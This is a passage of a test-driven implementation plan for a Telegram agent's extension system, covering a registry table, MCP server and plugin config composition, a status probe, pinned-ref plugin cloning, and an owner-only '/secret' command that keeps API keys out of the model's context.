- [ ] **Step 3: Add the table to `db.py`**

In `src/claude_hermes/db.py`, append to `_SCHEMA` (after the `turn_costs` block, inside the same
triple-quoted string):

```sql
CREATE TABLE IF NOT EXISTS extensions (
    name            TEXT PRIMARY KEY,
    kind            TEXT NOT NULL,
    catalog_version TEXT NOT NULL,
    state           TEXT NOT NULL DEFAULT 'enabled',
    installed_at    TEXT NOT NULL,
    installed_by    INTEGER,
    last_error      TEXT
);
```

There is deliberately **no** `spec_json` column: the specification lives in the catalog manifest,
keyed by `name`. That absence is what makes a catalog-only install impossible to bypass from chat.

No `_MIGRATIONS` entry is needed — `CREATE TABLE IF NOT EXISTS` in `_SCHEMA` runs on every open,
so existing databases pick the table up.

- [ ] **Step 4: Write the store**

`src/claude_hermes/extensions/store.py`:

```python
from __future__ import annotations

from ..db import Database


class ExtensionStore:
    """What is installed — never what it does. The spec lives in the catalog."""

    def __init__(self, db: Database):
        self._db = db

    async def add(self, name: str, kind: str, catalog_version: str,
                  installed_by: int, now: str) -> None:
        await self._db.conn.execute(
            """INSERT INTO extensions
                   (name, kind, catalog_version, state, installed_at, installed_by,
                    last_error)
               VALUES (?, ?, ?, 'enabled', ?, ?, NULL)
               ON CONFLICT(name) DO UPDATE SET
                 kind            = excluded.kind,
                 catalog_version = excluded.catalog_version,
                 state           = 'enabled',
                 installed_at    = excluded.installed_at,
                 installed_by    = excluded.installed_by,
                 last_error      = NULL""",
            (name, kind, catalog_version, now, installed_by),
        )
        await self._db.conn.commit()

    async def get(self, name: str) -> dict | None:
        cur = await self._db.conn.execute(
            "SELECT * FROM extensions WHERE name = ?", (name,)
        )
        row = await cur.fetchone()
        return dict(row) if row else None

    async def list(self, kind: str | None = None) -> list[dict]:
        if kind is None:
            cur = await self._db.conn.execute(
                "SELECT * FROM extensions ORDER BY name"
            )
        else:
            cur = await self._db.conn.execute(
                "SELECT * FROM extensions WHERE kind = ? ORDER BY name", (kind,)
            )
        return [dict(r) for r in await cur.fetchall()]

    async def enabled(self) -> list[dict]:
        cur = await self._db.conn.execute(
            "SELECT * FROM extensions WHERE state = 'enabled' ORDER BY name"
        )
        return [dict(r) for r in await cur.fetchall()]

    async def set_state(self, name: str, state: str) -> None:
        await self._db.conn.execute(
            "UPDATE extensions SET state = ? WHERE name = ?", (state, name)
        )
        await self._db.conn.commit()

    async def set_error(self, name: str, error: str | None) -> None:
        await self._db.conn.execute(
            "UPDATE extensions SET last_error = ? WHERE name = ?", (error, name)
        )
        await self._db.conn.commit()

    async def remove(self, name: str) -> None:
        await self._db.conn.execute("DELETE FROM extensions WHERE name = ?", (name,))
        await self._db.conn.commit()
```

- [ ] **Step 5: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_ext_store.py -v`
Expected: 8 passed

- [ ] **Step 6: Commit**

```bash
git add src/claude_hermes/db.py src/claude_hermes/extensions/store.py tests/test_ext_store.py
git commit -m "feat(extensions): registry table — the fact of installation, not the spec"
```

---

### Task 5: `compose.py` — catalog + registry + secrets → SDK structures

Pure: no network, no git, no subprocess. This is where the SDK's `mcp_servers` and `plugins`
shapes are produced.

**Files:**
- Create: `src/claude_hermes/extensions/compose.py`
- Test: `tests/test_compose.py`

**Interfaces:**
- Consumes: `catalog.Manifest`, `catalog.load_all`, `secrets.load`, `secrets.interpolate`, `ExtensionStore.enabled()`.
- Produces:
  - `@dataclass(frozen=True) Composed(mcp_servers: dict[str, dict], tool_names: list[str], plugins: list[dict], errors: dict[str, str])`
  - `plugin_dir(home: Path, name: str) -> Path`
  - `server_spec(m: Manifest, secrets: Mapping[str, str]) -> dict` — raises `ComposeError`
  - `async for_scope(home, store, scope, root=None) -> Composed`
  - `class ComposeError(ValueError)`

- [ ] **Step 1: Write the failing test**

`tests/test_compose.py`:

```python
import yaml

from claude_hermes.db import Database
from claude_hermes.extensions import catalog, compose, secrets
from claude_hermes.extensions.store import ExtensionStore

NOW = "2026-07-14T10:00:00+00:00"

HTTP = {
    "manifest_version": 1, "name": "example", "label": "Example", "description": "d",
    "version": "1.0.0", "transport": "http", "url": "https://mcp.example.com/mcp",
    "scopes": ["turn", "cron"],
    "auth": [{"name": "EXAMPLE_API_KEY", "prompt": "key", "header": "Authorization",
              "format": "Bearer ${EXAMPLE_API_KEY}"}],
}
STDIO_TURN_ONLY = {
    "manifest_version": 1, "name": "fs", "label": "FS", "description": "d",
    "version": "1.0.0", "transport": "stdio", "command": "npx",
    "args": ["-y", "server-filesystem", "/data"], "scopes": ["turn"],
}
PLUGIN = {
    "manifest_version": 1, "name": "thing", "label": "Thing", "description": "d",
    "version": "1.0.0", "repo": "https://github.com/o/r", "ref": "v1.0.0",
    "scopes": ["turn"],
}


def write_catalog(root):
    (root / "mcp").mkdir(parents=True)
    (root / "plugins").mkdir(parents=True)
    (root / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")
    (root / "mcp" / "fs.yaml").write_text(yaml.safe_dump(STDIO_TURN_ONLY), encoding="utf-8")
    (root / "plugins" / "thing.yaml").write_text(yaml.safe_dump(PLUGIN), encoding="utf-8")


async def make(tmp_path):
    db = await Database.open(tmp_path / "state.db")
    return db, ExtensionStore(db)


def test_server_spec_http_puts_the_secret_in_a_header():
    m = catalog.parse(HTTP, "mcp")
    spec = compose.server_spec(m, {"EXAMPLE_API_KEY": "abc"})
    assert spec == {"type": "http", "url": "https://mcp.example.com/mcp",
                    "headers": {"Authorization": "Bearer abc"}}


def test_server_spec_stdio_shape():
    m = catalog.parse(STDIO_TURN_ONLY, "mcp")
    spec = compose.server_spec(m, {})
    assert spec == {"type": "stdio", "command": "npx",
                    "args": ["-y", "server-filesystem", "/data"], "env": {}}


def test_server_spec_raises_when_a_secret_is_missing():
    m = catalog.parse(HTTP, "mcp")
    try:
        compose.server_spec(m, {})
    except compose.ComposeError as e:
        assert "EXAMPLE_API_KEY" in str(e)
    else:
        raise AssertionError("expected ComposeError")


async def test_for_scope_turn_includes_both_kinds(tmp_path):
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")
    await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.add("thing", "plugin", "1.0.0", installed_by=1, now=NOW)

    out = await compose.for_scope(tmp_path, store, "turn", root=root)
    assert set(out.mcp_servers) == {"example"}
    assert out.tool_names == ["mcp__example"]
    assert out.plugins == [
        {"type": "local", "path": str(compose.plugin_dir(tmp_path, "thing"))}
    ]
    assert out.errors == {}
    await db.close()


async def test_for_scope_cron_drops_a_turn_only_server(tmp_path):
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")
    await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.add("fs", "mcp", "1.0.0", installed_by=1, now=NOW)

    out = await compose.for_scope(tmp_path, store, "cron", root=root)
    assert set(out.mcp_servers) == {"example"}   # 'fs' is scopes: [turn]
    await db.close()


async def test_a_disabled_extension_is_absent(tmp_path):
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")
    await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.set_state("example", "disabled")

    out = await compose.for_scope(tmp_path, store, "turn", root=root)
    assert out.mcp_servers == {}
    await db.close()


async def test_a_server_whose_secret_vanished_is_dropped_not_raised(tmp_path):
    """One broken server must not kill the turn."""
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)   # no secret

    out = await compose.for_scope(tmp_path, store, "turn", root=root)
    assert out.mcp_servers == {}
    assert "EXAMPLE_API_KEY" in out.errors["example"]
    assert (await store.get("example"))["last_error"]
    await db.close()


async def test_a_row_whose_manifest_vanished_is_dropped_not_raised(tmp_path):
    """The image was rolled back and the entry is gone. Do not crash."""
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    await store.add("ghost", "mcp", "1.0.0", installed_by=1, now=NOW)

    out = await compose.for_scope(tmp_path, store, "turn", root=root)
    assert out.mcp_servers == {}
    assert "catalog" in out.errors["ghost"]
    await db.close()


async def test_a_healthy_server_clears_a_stale_error(tmp_path):
    root = tmp_path / "catalog"
    write_catalog(root)
    db, store = await make(tmp_path)
    await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)
    await store.set_error("example", "old failure")
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")

    await compose.for_scope(tmp_path, store, "turn", root=root)
    assert (await store.get("example"))["last_error"] is None
    await db.close()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_compose.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.extensions.compose'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/extensions/compose.py`:

```python
from __future__ import annotations

import logging
from collections.abc import Mapping
from dataclasses import dataclass, field
from pathlib import Path

from . import catalog, secrets
from .catalog import Manifest
from .store import ExtensionStore

log = logging.getLogger(__name__)

PLUGINS_SUBDIR = "plugins"


class ComposeError(ValueError):
    """This extension cannot be turned into a runnable spec right now."""


@dataclass(frozen=True)
class Composed:
    mcp_servers: dict[str, dict] = field(default_factory=dict)
    tool_names: list[str] = field(default_factory=list)
    plugins: list[dict] = field(default_factory=list)
    errors: dict[str, str] = field(default_factory=dict)


def plugin_dir(home: Path, name: str) -> Path:
    return home / "agent_home" / PLUGINS_SUBDIR / name


def server_spec(m: Manifest, secret_values: Mapping[str, str]) -> dict:
    """A catalog manifest plus the secrets on disk → the SDK's McpServerConfig.

    Raises ComposeError when a declared secret is absent: spawning a server with a
    literal ${VAR} for its credential is a slower, more confusing failure than
    refusing here.
    """
    absent = secrets.missing(m.secret_names(), secret_values)
    if absent:
        raise ComposeError(f"missing secret(s): {', '.join(absent)}")

    if m.transport == "stdio":
        return {
            "type": "stdio",
            "command": m.command,
            "args": [secrets.interpolate(a, secret_values) for a in m.args],
            "env": {k: secrets.interpolate(v, secret_values) for k, v in m.env.items()},
        }

    headers = {
        a.header: secrets.interpolate(a.format, secret_values)
        for a in m.auth if a.header
    }
    spec: dict = {"type": m.transport, "url": secrets.interpolate(m.url, secret_values)}
    if headers:
        spec["headers"] = headers
    return spec


async def for_scope(home: Path, store: ExtensionStore, scope: str,
                    root: Path | None = None) -> Composed:
    """Everything enabled and in scope, as the SDK wants it.

    Never raises. A broken extension is dropped from this turn, its reason recorded
    in `last_error`, and the conversation continues — one dead server must not take
    the chat down with it.
    """
    entries = catalog.load_all(root)
    secret_values = secrets.load(home)

    servers: dict[str, dict] = {}
    names: list[str] = []
    plugins: list[dict] = []
    errors: dict[str, str] = {}
    rows = await store.enabled()
    judged: dict[str, str | None] = {}   # only what THIS scope actually evaluated

    for row in rows:
        name = row["name"]
        m = entries.get(name)
        if m is None:
            errors[name] = "no longer in the catalog"
            judged[name] = errors[name]
            continue
        if scope not in m.scopes:
            continue        # out of scope here — say nothing about its health
        try:
            if m.kind == "plugin":
                path = plugin_dir(home, name)
                if not (path / ".claude-plugin" / "plugin.json").is_file():
                    raise ComposeError(f"plugin directory is missing or incomplete: {path}")
                plugins.append({"type": "local", "path": str(path)})
            else:
                servers[name] = server_spec(m, secret_values)
                # Server-level entry: allows every tool this server exposes. Belt and
                # braces — permission_mode is bypassPermissions anyway.
                names.append(f"mcp__{name}")
            judged[name] = None
        except ComposeError as e:
            errors[name] = str(e)
            judged[name] = errors[name]
            log.warning("extension %s dropped from this %s: %s", name, scope, e)

    # Persist only verdicts this scope is entitled to give: a cron pass must not clear
    # an error the turn recorded about a turn-only server it never looked at.
    for row in rows:
        name = row["name"]
        if name in judged and row["last_error"] != judged[name]:
            await store.set_error(name, judged[name])

    return Composed(mcp_servers=servers, tool_names=names, plugins=plugins, errors=errors)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_compose.py -v`
Expected: 9 passed

- [ ] **Step 5: Commit**

```bash
git add src/claude_hermes/extensions/compose.py tests/test_compose.py
git commit -m "feat(extensions): compose catalog + registry + secrets into SDK structures"
```

---

### Task 6: `probe.py` — does the server actually come up?

`ClaudeSDKClient.get_mcp_status()` connects the configured servers and reports per-server status,
tools and error — **without a model call**, so `test` and the probe inside `add` are free.

**Files:**
- Create: `src/claude_hermes/extensions/probe.py`
- Test: `tests/test_probe.py`

**Interfaces:**
- Consumes: `base_options` (Task 1).
- Produces: `@dataclass(frozen=True) ProbeResult(status: str, tools: list[str], error: str)` and `async probe(home: Path, name: str, spec: dict, timeout: float = 60.0) -> ProbeResult`.

- [ ] **Step 1: Write the failing test**

`tests/test_probe.py`:

```python
import asyncio

import claude_hermes.extensions.probe as probe_mod
from claude_hermes.extensions.probe import probe

SPEC = {"type": "stdio", "command": "npx", "args": ["-y", "pkg"], "env": {}}


class FakeClient:
    """Stands in for ClaudeSDKClient: an async context manager with get_mcp_status()."""

    def __init__(self, options=None, status=None, boom=None):
        self.options = options
        self._status = status
        self._boom = boom

    async def __aenter__(self):
        if self._boom:
            raise self._boom
        return self

    async def __aexit__(self, *exc):
        return False

    async def get_mcp_status(self):
        return self._status


async def test_probe_reports_a_connected_server(tmp_path, monkeypatch):
    status = {"mcpServers": [
        {"name": "hermes", "status": "connected", "tools": [{"name": "memory_save"}]},
        {"name": "example", "status": "connected",
         "tools": [{"name": "search"}, {"name": "create"}]},
    ]}
    monkeypatch.setattr(probe_mod, "ClaudeSDKClient",
                        lambda options: FakeClient(options, status=status))

    got = await probe(tmp_path, "example", SPEC)
    assert got.status == "connected"
    assert got.tools == ["search", "create"]     # only this server's tools
    assert got.error == ""


async def test_probe_reports_a_failed_server(tmp_path, monkeypatch):
    status = {"mcpServers": [
        {"name": "example", "status": "failed", "error": "connection refused"},
    ]}
    monkeypatch.setattr(probe_mod, "ClaudeSDKClient",
                        lambda options: FakeClient(options, status=status))

    got = await probe(tmp_path, "example", SPEC)
    assert got.status == "failed" and "connection refused" in got.error


async def test_probe_reports_a_server_the_cli_never_mentioned(tmp_path, monkeypatch):
    monkeypatch.setattr(probe_mod, "ClaudeSDKClient",
                        lambda options: FakeClient(options, status={"mcpServers": []}))

    got = await probe(tmp_path, "example", SPEC)
    assert got.status == "failed" and got.error


async def test_probe_turns_a_crash_into_a_result(tmp_path, monkeypatch):
    """A probe must never raise into the turn."""
    monkeypatch.setattr(probe_mod, "ClaudeSDKClient",
                        lambda options: FakeClient(options, boom=RuntimeError("cli gone")))

    got = await probe(tmp_path, "example", SPEC)
    assert got.status == "failed" and "cli gone" in got.error


async def test_probe_times_out(tmp_path, monkeypatch):
    class Slow(FakeClient):
        async def __aenter__(self):
            await asyncio.sleep(5)
            return self

    monkeypatch.setattr(probe_mod, "ClaudeSDKClient", lambda options: Slow(options))

    got = await probe(tmp_path, "example", SPEC, timeout=0.01)
    assert got.status == "failed" and "timed out" in got.error


async def test_probe_asks_for_no_tools_and_no_turns(tmp_path, monkeypatch):
    """The probe is a handshake, not a conversation: it must cost nothing."""
    seen = {}

    def capture(options):
        seen["options"] = options
        return FakeClient(options, status={"mcpServers": [
            {"name": "example", "status": "connected", "tools": []}]})

    monkeypatch.setattr(probe_mod, "ClaudeSDKClient", capture)
    await probe(tmp_path, "example", SPEC)

    assert seen["options"].tools == []
    assert seen["options"].allowed_tools == []
    assert seen["options"].mcp_servers == {"example": SPEC}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_probe.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.extensions.probe'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/extensions/probe.py`:

```python
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from pathlib import Path

from claude_agent_sdk import ClaudeSDKClient

from ..config import NO_ADVISOR_ENV
from ..options import base_options

log = logging.getLogger(__name__)


@dataclass(frozen=True)
class ProbeResult:
    status: str                                     # 'connected' | 'failed' | …
    tools: list[str] = field(default_factory=list)
    error: str = ""


async def probe(home: Path, name: str, spec: dict, timeout: float = 60.0) -> ProbeResult:
    """Bring one server up and ask the CLI what happened. No model call, no cost.

    Never raises: a probe that throws would turn "this server is broken" into "your
    message failed", which is a worse answer to the same question.
    """
    options = base_options(
        home,
        mcp_servers={name: spec},
        tools=[],            # a handshake, not a conversation
        allowed_tools=[],
        max_turns=1,
        env=NO_ADVISOR_ENV,
    )

    async def _run() -> ProbeResult:
        async with ClaudeSDKClient(options) as client:
            status = await client.get_mcp_status()
        for server in status.get("mcpServers", []):
            if server.get("name") != name:
                continue           # 'hermes' and any other server share this response
            tools = [t.get("name", "") for t in server.get("tools", []) or []]
            return ProbeResult(
                status=server.get("status", "failed"),
                tools=[t for t in tools if t],
                error=server.get("error", "") or "",
            )
        return ProbeResult(status="failed",
                           error="the CLI did not report this server at all")

    try:
        return await asyncio.wait_for(_run(), timeout=timeout)
    except asyncio.TimeoutError:
        return ProbeResult(status="failed", error=f"timed out after {timeout:.0f}s")
    except Exception as e:                                   # noqa: BLE001
        log.warning("probe of %s failed", name, exc_info=True)
        return ProbeResult(status="failed", error=str(e))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_probe.py -v`
Expected: 6 passed

- [ ] **Step 5: Commit**

```bash
git add src/claude_hermes/extensions/probe.py tests/test_probe.py
git commit -m "feat(extensions): probe a server via get_mcp_status, no model call"
```

---

### Task 7: `install.py` — cloning a plugin

**Files:**
- Create: `src/claude_hermes/extensions/install.py`
- Test: `tests/test_install.py`

**Interfaces:**
- Consumes: `catalog.Manifest`, `compose.plugin_dir`.
- Produces: `async clone_plugin(home: Path, m: Manifest, timeout: float = 120.0) -> Path`, `remove_plugin(home: Path, name: str) -> None`, `class InstallError(RuntimeError)`.

- [ ] **Step 1: Write the failing test**

`tests/test_install.py`:

```python
import pytest

import claude_hermes.extensions.install as install_mod
from claude_hermes.extensions import catalog, compose
from claude_hermes.extensions.install import InstallError, clone_plugin, remove_plugin

PLUGIN = {
    "manifest_version": 1, "name": "thing", "label": "Thing", "description": "d",
    "version": "1.0.0", "repo": "https://github.com/o/r", "ref": "v1.0.0",
    "scopes": ["turn"],
}


def fake_git(rc: int, stderr: str = "", *, materialize=None):
    """Stand in for asyncio.create_subprocess_exec."""
    async def run(*argv, stdout=None, stderr_=None, **kw):
        if materialize is not None:
            materialize(argv)

        class P:
            returncode = rc

            async def communicate(self):
                return b"", stderr.encode()

            def kill(self):
                pass

        return P()

    return run


async def test_clone_succeeds_and_returns_the_directory(tmp_path, monkeypatch):
    m = catalog.parse(PLUGIN, "plugin")
    target = compose.plugin_dir(tmp_path, "thing")

    def materialize(argv):
        (target / ".claude-plugin").mkdir(parents=True)
        (target / ".claude-plugin" / "plugin.json").write_text("{}", encoding="utf-8")

    monkeypatch.setattr(install_mod.asyncio, "create_subprocess_exec",
                        fake_git(0, materialize=materialize))
    got = await clone_plugin(tmp_path, m)
    assert got == target and (target / ".claude-plugin" / "plugin.json").is_file()


async def test_clone_pins_the_ref_and_shallow_clones(tmp_path, monkeypatch):
    m = catalog.parse(PLUGIN, "plugin")
    target = compose.plugin_dir(tmp_path, "thing")
    seen = {}

    def materialize(argv):
        seen["argv"] = argv
        (target / ".claude-plugin").mkdir(parents=True)
        (target / ".claude-plugin" / "plugin.json").write_text("{}", encoding="utf-8")

    monkeypatch.setattr(install_mod.asyncio, "create_subprocess_exec",
                        fake_git(0, materialize=materialize))
    await clone_plugin(tmp_path, m)

    argv = seen["argv"]
    assert argv[0] == "git" and "--depth" in argv and "1" in argv
    assert "--branch" in argv and "v1.0.0" in argv
    assert "https://github.com/o/r" in argv


async def test_a_failed_clone_leaves_nothing_behind(tmp_path, monkeypatch):
    m = catalog.parse(PLUGIN, "plugin")

    def materialize(argv):
        compose.plugin_dir(tmp_path, "thing").mkdir(parents=True)   # a half-clone

    monkeypatch.setattr(install_mod.asyncio, "create_subprocess_exec",
                        fake_git(128, "fatal: repository not found", materialize=materialize))

    with pytest.raises(InstallError, match="repository not found"):
        await clone_plugin(tmp_path, m)
    assert not compose.plugin_dir(tmp_path, "thing").exists()


async def test_a_clone_without_a_plugin_manifest_is_rejected(tmp_path, monkeypatch):
    """Cloned fine, but it is not a Claude Code plugin. Do not register it."""
    m = catalog.parse(PLUGIN, "plugin")

    def materialize(argv):
        compose.plugin_dir(tmp_path, "thing").mkdir(parents=True)

    monkeypatch.setattr(install_mod.asyncio, "create_subprocess_exec",
                        fake_git(0, materialize=materialize))

    with pytest.raises(InstallError, match="plugin.json"):
        await clone_plugin(tmp_path, m)
    assert not compose.plugin_dir(tmp_path, "thing").exists()


async def test_remove_plugin_is_idempotent(tmp_path):
    remove_plugin(tmp_path, "thing")                     # nothing there — no raise
    d = compose.plugin_dir(tmp_path, "thing")
    d.mkdir(parents=True)
    remove_plugin(tmp_path, "thing")
    assert not d.exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_install.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'claude_hermes.extensions.install'`

- [ ] **Step 3: Write the implementation**

`src/claude_hermes/extensions/install.py`:

```python
from __future__ import annotations

import asyncio
import logging
import shutil
from pathlib import Path

from .catalog import Manifest
from .compose import plugin_dir

log = logging.getLogger(__name__)


class InstallError(RuntimeError):
    """The plugin could not be installed. Nothing was left on disk."""


def remove_plugin(home: Path, name: str) -> None:
    shutil.rmtree(plugin_dir(home, name), ignore_errors=True)


async def clone_plugin(home: Path, m: Manifest, timeout: float = 120.0) -> Path:
    """Shallow-clone a catalog plugin at its pinned ref.

    The repo and ref come from the manifest, never from chat — argv is built from
    reviewed data. On any failure the directory is removed: a half-clone that the
    composer would later try to load is worse than no clone at all.
    """
    target = plugin_dir(home, m.name)
    remove_plugin(home, m.name)                     # a re-install starts clean
    target.parent.mkdir(parents=True, exist_ok=True)

    argv = [
        "git", "clone", "--depth", "1", "--branch", m.ref,
        "--single-branch", m.repo, str(target),
    ]
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            _, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            raise InstallError(f"git clone timed out after {timeout:.0f}s") from None
        if proc.returncode != 0:
            raise InstallError(err.decode(errors="replace").strip() or "git clone failed")

        if not (target / ".claude-plugin" / "plugin.json").is_file():
            raise InstallError(
                f"{m.repo}@{m.ref} has no .claude-plugin/plugin.json — "
                "it is not a Claude Code plugin"
            )
    except InstallError:
        remove_plugin(home, m.name)
        raise
    except Exception as e:                                   # noqa: BLE001
        remove_plugin(home, m.name)
        raise InstallError(str(e)) from e

    return target
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/python -m pytest tests/test_install.py -v`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add src/claude_hermes/extensions/install.py tests/test_install.py
git commit -m "feat(extensions): clone a catalog plugin at a pinned ref"
```

---

### Task 8: owner check and the `/secret` gateway command

The secret must never reach the model. It is intercepted before `runner.run_turn` is called.

**Files:**
- Modify: `src/claude_hermes/acl.py`, `src/claude_hermes/gateway/events.py`, `src/claude_hermes/gateway/telegram.py:34-55,97-147`
- Test: `tests/test_acl.py` (extend), `tests/test_secret_command.py`

**Interfaces:**
- Consumes: `secrets.put` (Task 2).
- Produces:
  - `AccessControl.is_owner(user_id: int) -> bool`
  - `MessageEvent.message_id: int = 0`
  - `handle_event(runner, cfg, event, *, acl, home, progress=None, delete_message=None)` — new keyword-only `home` and `delete_message` parameters.
  - `create_dispatcher(runner, cfg, bot_username, acl, *, sender, titler, home)`

- [ ] **Step 1: Write the failing test**

`tests/test_secret_command.py`:

```python
from pathlib import Path

import pytest

from claude_hermes.acl import AccessControl
from claude_hermes.config import Config
from claude_hermes.db import Database
from claude_hermes.extensions import secrets
from claude_hermes.gateway.events import MessageEvent
from claude_hermes.gateway.telegram import handle_event


class SpyRunner:
    def __init__(self):
        self.turns = []

    async def run_turn(self, key, text, progress=None):
        self.turns.append(text)
        return "reply"

    async def reset(self, key):
        pass


def event(text, user_id=1):
    return MessageEvent(chat_type="private", chat_id=1, user_id=user_id, text=text,
                        mentioned=False, thread_id=None, message_id=99)


async def setup(tmp_path, owner_id=1):
    db = await Database.open(tmp_path / "state.db")
    acl = AccessControl(db, Config())
    await acl.check(owner_id, "private")          # first private user claims ownership
    return db, acl


async def test_secret_is_stored_and_never_reaches_the_runner(tmp_path):
    db, acl = await setup(tmp_path)
    runner, deleted = SpyRunner(), []

    async def delete_message():
        deleted.append(True)

    reply = await handle_event(
        runner, Config(), event("/secret EXAMPLE_API_KEY=abc123"),
        acl=acl, home=tmp_path, delete_message=delete_message,
    )

    assert secrets.load(tmp_path) == {"EXAMPLE_API_KEY": "abc123"}
    assert runner.turns == []                     # the model never saw it
    assert deleted == [True]                      # the chat message is gone
    assert "EXAMPLE_API_KEY" in reply
    assert "abc123" not in reply                  # never echo the value
    await db.close()


async def test_a_non_owner_is_refused_but_the_message_is_still_deleted(tmp_path):
    """It may have been someone's real key. Delete it either way."""
    db, acl = await setup(tmp_path, owner_id=1)
    runner, deleted = SpyRunner(), []

    async def delete_message():
        deleted.append(True)

    reply = await handle_event(
        runner, Config(), event("/secret EXAMPLE_API_KEY=abc", user_id=2),
        acl=acl, home=tmp_path, delete_message=delete_message,
    )

    assert secrets.load(tmp_path) == {}
    assert deleted == [True]
    assert "owner" in reply.lower()
    await db.close()


@pytest.mark.parametrize("text", ["/secret", "/secret NOVALUE", "/secret lower=x"])
async def test_malformed_secret_commands_explain_themselves(tmp_path, text):
    db, acl = await setup(tmp_path)
    runner = SpyRunner()

    reply = await handle_event(runner, Config(), event(text), acl=acl, home=tmp_path)

    assert secrets.load(tmp_path) == {}
    assert runner.turns == []
    assert "NAME=value" in reply
    await db.close()


async def test_an_ordinary_message_still_reaches_the_runner(tmp_path):
    db, acl = await setup(tmp_path)
    runner = SpyRunner()

    reply = await handle_event(runner, Config(), event("привет"), acl=acl, home=tmp_path)

    assert runner.turns == ["привет"] and reply == "reply"
    await db.close()
```

Append to `tests/test_acl.py`:

```python
async def test_is_owner_distinguishes_owner_from_allowlisted(tmp_path):
    from claude_hermes.acl import AccessControl
    from claude_hermes.config import Config
    from claude_hermes.db import Database

    db = await Database.open(tmp_path / "state.db")
    cfg = Config()
    cfg.allowed_users = [2]
    acl = AccessControl(db, cfg)

    await acl.check(1, "private")                 # 1 claims ownership
    assert await acl.check(2, "private") == "allow"   # 2 is allowlisted…
    assert await acl.is_owner(1) is True
    assert await acl.is_owner(2) is False             # …but is not the owner
    await db.close()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_secret_command.py tests/test_acl.py -v`
Expected: FAIL — `TypeError: handle_event() got an unexpected keyword argument 'home'`

- [ ] **Step 3: Add `is_owner` to `acl.py`**

Append to `class AccessControl` in `src/claude_hermes/acl.py`:

```python
    async def is_owner(self, user_id: int) -> bool:
        """Stricter than check(): an allowlisted user may talk to the agent, but only
        the owner may change what the agent *is* — install extensions, store secrets."""
        owner = await self._db.get_meta(_OWNER_KEY)
        return owner is not None and user_id == int(owner)
```

- [ ] **Step 4: Add `message_id` to `MessageEvent`**

In `src/claude_hermes/gateway/events.py`, add the field to the dataclass (last, with a default,
so existing constructions keep working):

```python
    message_id: int = 0
```

- [ ] **Step 5: Add the `/secret` branch to `handle_event`**

In `src/claude_hermes/gateway/telegram.py`, add the imports:

```python
from pathlib import Path

from ..extensions import secrets
```

Add the module constants next to `_REFUSAL` / `_RESET_ACK`:

```python
_SECRET_USAGE = (
    "Usage: /secret NAME=value — e.g. /secret EXAMPLE_API_KEY=abc123. "
    "NAME must look like an environment variable (A-Z, digits, underscore)."
)
_SECRET_DENIED = "Only the owner may store secrets."
```

Change the signature of `handle_event` and add the branch **before** the `/new` branch:

```python
async def handle_event(runner, cfg: Config, event: MessageEvent, *, acl,
                       home: Path, progress=None, delete_message=None) -> str | None:
    """Route one Telegram update. Returns the final reply text, or None to stay silent."""
    verdict = await _verdict(cfg, event, acl)
    if verdict == "ignore":
        return None
    if verdict == "deny":
        return _REFUSAL if event.chat_type == "private" else None

    text = event.text
    command, _, rest = text.partition(" ")
    command = command.split("@", 1)[0]          # tolerate /cmd@botname
    key = build_session_key(
        event.chat_type, event.chat_id, user_id=event.user_id, thread_id=event.thread_id
    )
    if command == "/secret":
        # Handled here and NOT passed to the runner on purpose: a secret that reaches
        # run_turn ends up in the LLM context, the SDK transcript and messages_fts,
        # and no amount of deleting the chat message gets it back out of those.
        return await _handle_secret(rest, event, acl=acl, home=home,
                                    delete_message=delete_message)
    if command == "/new":
        await runner.reset(key)
        return _RESET_ACK
    if command == "/learn":
        text = build_learn_prompt(rest.strip())

    return await runner.run_turn(key, text, progress=progress)


async def _handle_secret(rest: str, event: MessageEvent, *, acl, home: Path,
                         delete_message) -> str:
    """Store one secret in CH_HOME/secrets.env. The message carrying it is deleted
    whatever happens — even a refused one may hold a real key."""
    if delete_message is not None:
        try:
            await delete_message()
        except Exception:
            log.warning("could not delete the message carrying a secret", exc_info=True)

    if not await acl.is_owner(event.user_id):
        return _SECRET_DENIED

    name, sep, value = rest.strip().partition("=")
    if not sep or not value:
        return _SECRET_USAGE
    try:
        secrets.put(home, name.strip(), value)
    except secrets.SecretNameError:
        return _SECRET_USAGE
    return f"Saved {name.strip()}. The message with it has been deleted."
```

